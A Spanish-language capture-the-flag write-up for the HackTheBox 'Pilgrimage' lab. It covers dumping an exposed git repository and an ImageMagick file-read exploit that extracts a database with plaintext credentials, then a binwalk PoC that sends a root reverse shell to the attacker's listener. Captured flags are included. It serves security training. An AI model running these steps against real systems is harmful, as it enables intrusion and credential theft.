---
tags:
title: Pilgrimage- Easy (HTB)
permalink: /Pilgrimage-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
 nmap -sCV -p22,80 10.129.235.66                                      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-17 21:20 -03
Nmap scan report for 10.129.235.66
Host is up (0.73s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.01 seconds
```

## Website 

La web me muestra una seccion donde puedo subir archivos, de los cuales esos se va a comprimir (encoger), por asi decir.

![image-center](/assets/images/Pasted image 20251218021210.png)

Intente métodos de bypass para intentar subir un archivo `.php` malicioso pero no tuve éxito ya que cualquier archivo lo sube y le cambia la extensión o extensiones a `.jpeg`.
### Feroxbuster enumeration

El escaneo no revela rutas nuevas ni nada.
```bash
feroxbuster -u http://pilgrimage.htb -C 404 -x php,xml
<SNIP>
301      GET        7l       11w      169c http://pilgrimage.htb/tmp => http://pilgrimage.htb/tmp/
302      GET        0l        0w        0c http://pilgrimage.htb/logout.php => http://pilgrimage.htb/
200      GET      171l      403w     6166c http://pilgrimage.htb/login.php
200      GET      171l      403w     6173c http://pilgrimage.htb/register.php
302      GET        0l        0w        0c http://pilgrimage.htb/dashboard.php => http://pilgrimage.htb/login.php
<SNIP>
```

## Git repository

Usando la tool `dirsearch` me descubre el directorio `/.git/`.

```bash
dirsearch -u http://pilgrimage.htb
<SNIP>
Target: http://pilgrimage.htb/

[22:46:36] Starting: 
[22:46:52] 301 -  169B  - /.git  ->  http://pilgrimage.htb/.git/            
[22:46:52] 403 -  555B  - /.git/branches/                                   
[22:46:52] 200 -   92B  - /.git/config
[22:46:52] 200 -   73B  - /.git/description
[22:46:52] 200 -    2KB - /.git/COMMIT_EDITMSG
[22:46:52] 200 -   23B  - /.git/HEAD
<SNIP>
```

### Git-dumper

Por lo que use [git-dumper](https://github.com/arthaud/git-dumper) para poder extraer los datos interesantes de ese repositorio.

```bash
python3 git_dumper.py http://pilgrimage.htb/ git     
[-] Testing http://pilgrimage.htb/.git/HEAD [200]
[-] Testing http://pilgrimage.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://pilgrimage.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://pilgrimage.htb/.git/description [200]
[-] Fetching http://pilgrimage.htb/.gitignore [404]
[-] http://pilgrimage.htb/.gitignore responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-applypatch.sample [200]
<SNIP>
```

Una vez termina, veo los archivos que hacen funcionar a la pagina, entre ellos este.

```bash
cat dashboard.php 
<?php
session_start();
if(!isset($_SESSION['user'])) {
  header("Location: /login.php");
  exit(0);
}

function returnUsername() {
  return "\"" . $_SESSION['user'] . "\"";
}

function fetchImages() {
  $username = $_SESSION['user'];
  $db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("SELECT * FROM images WHERE username = ?");
  $stmt->execute(array($username));
  $allImages = $stmt->fetchAll(\PDO::FETCH_ASSOC);
  return json_encode($allImages);
```

Es así como veo que los datos se guardan en la base de datos `/var/db/pilgrimage`, la cual es `sqlite`, esto es un dato interesante para mas adelante.
## Exploit

También en la misma carpeta me dejo el binario de `ImageMagik`, con una versión.

```bash
./magick --version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

Buscando por exploit para esta versión, llegué a este [enlace](https://www.hackplayers.com/2023/02/imagemagick-la-vulnerabilidad-oculta.html) donde muestra como dentro de una imagen, un atacante puedo colocar datos, los cuales cuando se realiza un `shrink` de dicha imagen, el contenido que insertemos se interprete, y de esta manera puedo leer archivos locales de la maquina.
### Example

Para ver si este PoC funciona, primero tengo que instalar las dependencias.

```bash
apt-get install pngcrush imagemagick exiftool exiv2 -y
```

Y luego insertar el nombre del archivo a `exfiltrar` dentro de la imagen.

```bash
pngcrush -text a "profile" "/etc/hosts" gato.png
```

Por esto me deja una imagen "`malicosa`" la cual la subo a la pagina.

![image-center](/assets/images/Pasted image 20251218022107.png)

Yendo a la `url` me aparece mi imagen, la descargo y sigo con el proceso.

```bash
identify -verbose test.png  
<SNIP>
    Raw profile type: 

     205
3132372e302e302e31096c6f63616c686f73740a3132372e302e312e310970696c677269
6d6167652070696c6772696d6167652e6874620a0a232054686520666f6c6c6f77696e67
206c696e65732061726520646573697261626c6520666f7220495076362063617061626c
6520686f7374730a3a3a3120202020206c6f63616c686f7374206970362d6c6f63616c68
6f7374206970362d6c6f6f706261636b0a666630323a3a31206970362d616c6c6e6f6465
730a666630323a3a32206970362d616c6c726f75746572730a
<SNIP>
```

Ahora que tengo la data en hexadecimal, uso `python3` para decodificarla, lo que me da como resultado, el contenido del archivo `/etc/hosts` de la maquina victima.

```bash
python3 -c 'print(bytes.fromhex("3132372e302e302e31096c6f63616c686f73740a3132372e302e312e310970696c6772696d6167652070696c6772696d6167652e6874620a0a232054686520666f6c6c6f77696e67206c696e65732061726520646573697261626c6520666f7220495076362063617061626c6520686f7374730a3a3a3120202020206c6f63616c686f7374206970362d6c6f63616c686f7374206970362d6c6f6f706261636b0a666630323a3a31206970362d616c6c6e6f6465730a666630323a3a32206970362d616c6c726f75746572730a").decode("utf-8"))'                                                                              
127.0.0.1 localhost
127.0.1.1 pilgrimage pilgrimage.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
## Shell as emily

Puedo repetir el proceso, pero ahora con la base de datos, que es el único dato que conozco, solo que para poder decodificar los datos use `xxd` ya que con `python3`, devuelve caracteres no legibles. Puedo usarl el mismo y enviar la data a un archivo para luego analizarlo

```bash
 cat data  | tr -d '\n' | xxd -r -p > database.sqlite
         
��e��8|�StableimagesimagesCREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL)+?indexsqlite_autoindex_images_1imagesf�+tableusersusersCREATE��▒-emilyabigchonkyboi123XT PRIMARY KEY NOT NULL, password TEXT NOT NULL))=indexsqlite_autoindex_users_1users
��emily
```
### Sqlite file

Ahora examinando el contenido del archivo, veo que si es una base de datos de `SQLite3`.

```bash
 file database.sqlite 
database.sqlite: SQLite 3.x database, last written using SQLite version 3034001, file counter 80, database pages 5, cookie 0x4, schema 4, UTF-8, version-valid-for 80
```

Por lo que puedo usar el siguiente comando para conectarme.

```bash
sqlite3 database.sqlite 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite>
```
### Credentials

Listo tablas, y extraigo el contenido de las mismas.

```bash
sqlite> .tables
images  users 
sqlite> select * from users;
emily|abigchonkyboi123
```

Y las credenciales encontradas son validas para loguearme vía `ssh`
```bash
 ssh emily@pilgrimage.htb 
<SNIP>
emily@pilgrimage:~$ cat user.txt 
f3b70f1c64379878013e0e9ebf2b9a6c
```
## Shell as root
### Proccess

Listando procesos, veo uno que no es muy común, lo que parece ser un script personalizado que corre como el usuario `root`.
```bash
ps -faux 
<SNIP>
root         666  0.0  0.0   6816  2988 ?        Ss   11:20   0:00 /bin/bash /usr/sbin/malwarescan.sh
root         721  0.0  0.0   2516   716 ?        S    11:20   0:00  \_ /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
root         722  0.0  0.0   6816  2384 ?        S    11:20   0:00  \_ /bin/bash /usr/sbin/malwarescan.sh
<SNIP>
```
## Script
Analizando el contenido del mismo, lo que mas destaca es que con `binwalk` examina las imágenes, que están en el directorio `/var/www/pilgrimage.htb/shrunk/`.

```bash
emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
 filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
 binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
  if [[ "$binout" == *"$banned"* ]]; then
   /usr/bin/rm "$filename"
   break
  fi
 done
done
```
### CVE

Buscando la versión obtengo esta.

```bash
emily@pilgrimage:~$ /usr/local/bin/binwalk

Binwalk v2.3.2
<SNIP>
```

La versión que encontré tiene una vulnerabilidad la cual me permite ejecutar códigos, y por ende en este caso escalar mis privilegios al usuario `root`, para eso encontré este [PoC](https://www.exploit-db.com/exploits/51249) en `python3`, ademas para el uso del mismo necesito de una imagen cualquiera, por lo que me transferí la mía a la maquina con `wget`

```bash
emily@pilgrimage:/tmp$ wget http://10.10.17.19/gatt.png
--2025-12-18 13:37:58--  http://10.10.17.19/gatt.png
Connecting to 10.10.17.19:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 61403 (60K) [image/png]
Saving to: ‘gatt.png’

gatt.png                                       100%[===================================================================================================>]  59.96K  36.9KB/s    in 1.6s   
```

Ejecute el script colocando la `ip`, `puerto` a la que se envía la `shell`, y la imagen la cual va a ser tomada de referencia para crear la maliciosa.

```bash
emily@pilgrimage:/tmp$ python3 binwalk.py gatt.png 10.10.17.19 4444
<SNIP>
You can now rename and share binwalk_exploit and start your local netcat listener.
```
### Malicious image

Ahora ya tengo la imagen maliciosa.

```bash
emily@pilgrimage:/tmp$ ls
binwalk_exploit.png  systemd-private-60570b607c7d442a97f17d4b751cf8c5-systemd-logind.service-7TBtMh     vmware-root_572-2999067484
binwalk.py           systemd-private-60570b607c7d442a97f17d4b751cf8c5-systemd-timesyncd.service-h9pv3h
gatt.png             test
```
## Shell

La copio al directorio, en el cual se va a examinar.

```bash
emily@pilgrimage:/tmp$ cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/binwalk_exploit.png
```

Y como es previsto desde mi listener `nc` recibo la conexión como el usuario `root`.

```bash
sudo nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.235.66] 45414
whoami
root
```

```bash
cat /root/root.txt
047412bdce8c64b03a7e51719338d6d1
```

`~Happy Hacking.`